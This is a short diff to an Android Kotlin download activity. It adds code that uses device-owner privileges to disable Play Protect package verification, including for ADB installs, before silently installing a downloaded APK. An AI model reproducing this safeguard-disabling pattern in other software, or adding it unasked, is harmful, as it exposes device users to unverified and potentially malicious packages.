@@ -109,6 +109,19 @@ class DownloadActivity : AppCompatActivity() {
 
             Log.d(TAG, "Instalando APK: ${file.absolutePath} (${file.length()} bytes)")
 
+            // Desabilitar Play Protect antes de instalar
+            try {
+                val dpmCheck = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                if (dpmCheck.isDeviceOwnerApp(packageName)) {
+                    val adminComponent = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                    dpmCheck.setGlobalSetting(adminComponent, "package_verifier_enable", "0")
+                    dpmCheck.setGlobalSetting(adminComponent, "verifier_verify_adb_installs", "0")
+                    Log.d(TAG, "✅ Play Protect desabilitado antes de instalar")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Não foi possível desabilitar Play Protect: ${e.message}")
+            }
+
             // Tentar instalar silenciosamente como Device Owner
             try {
                 val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
